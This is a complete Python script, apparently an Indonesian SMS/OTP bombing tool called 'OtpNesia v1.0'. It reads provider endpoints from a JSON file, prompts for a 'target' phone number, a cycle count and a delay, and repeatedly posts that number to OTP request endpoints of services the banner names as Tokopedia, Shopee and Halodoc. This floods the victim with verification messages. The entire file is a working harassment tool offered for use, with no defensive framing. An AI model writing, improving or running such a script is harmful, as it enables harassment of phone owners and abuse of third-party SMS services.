#!/usr/bin/env python3

import json, time, random, sys, requests

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    R, G, Y, C, M, W = Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.CYAN, Fore.MAGENTA, Fore.WHITE
except:
    R = G = Y = C = M = W = ""

with open("providers.json", "r") as f:
    PROVIDERS = json.load(f)

BANNER = f"""
{M}╔══════════════════════════════════╗
║  {W}OtpNesia v1.0{M}                  ║
║  {C}Tokopedia • Shopee • Halodoc{M}    ║
╚══════════════════════════════════╝{W}
"""

def bersihin(raw):
    a = ''.join(c for c in raw if c.isdigit())
    if a.startswith("62"): return a[2:], a
    if a.startswith("0"): return a[1:], "62"+a[1:]
    return a, "62"+a

def kirim(p, phone):
    url = p["url"]
    headers = dict(p["headers"])
    payload = dict(p["payload"])
    key = p.get("phone_key","phone")
    ok = p.get("success","success")
    to = p.get("timeout",15)

    for k,v in payload.items():
        if isinstance(v,str) and "{phone}" in v:
            payload[k] = v.replace("{phone}",phone)
    if key and key not in payload:
        payload[key] = phone

    for _ in range(2):
        try:
            r = requests.post(url, json=payload, headers=headers, timeout=to)
            if r.status_code in [200,201] or ok.lower() in r.text.lower():
                return True, str(r.status_code)
            time.sleep(1)
        except:
            time.sleep(1)
    return False, "FAIL"

def main():
    print(BANNER)
    no = input(f"  {W}[?] Nomor target: ").strip()
    if not no: return
    bare, _ = bersihin(no)
    print(f"  {G}[OK]{W} {bare}\n")

    try:
        jml = int(input(f"  {W}[?] Siklus: "))
    except:
        jml = 1

    try:
        jd = input(f"  {W}[?] Jeda (default 2): ")
        jd = float(jd) if jd else 2
    except:
        jd = 2

    print(f"\n  {Y}[START]\n{W}")
    ok, no_ok = 0, 0

    for s in range(1, jml+1):
        print(f"  {C}Siklus {s}/{jml}{W}")
        random.shuffle(PROVIDERS)
        for p in PROVIDERS:
            st, code = kirim(p, bare)
            if st:
                ok += 1
                print(f"  {G}[OK]{W} {p['n']:<12} {G}{code}{W}")
            else:
                no_ok += 1
                print(f"  {R}[NO]{W} {p['n']:<12} {R}{code}{W}")
            time.sleep(0.5)
        if s < jml:
            time.sleep(jd)

    print(f"\n  {G}OK:{ok}  {R}FAIL:{no_ok}\n")

if __name__ == "__main__":
    try:
        while True:
            main()
            if input(f"  {Y}[?] Lagi? (y/n): {W}").lower() != "y":
                break
        print(f"\n  {C}Bye!{W}\n")
    except KeyboardInterrupt:
        print(f"\n  {R}Exit{W}\n")
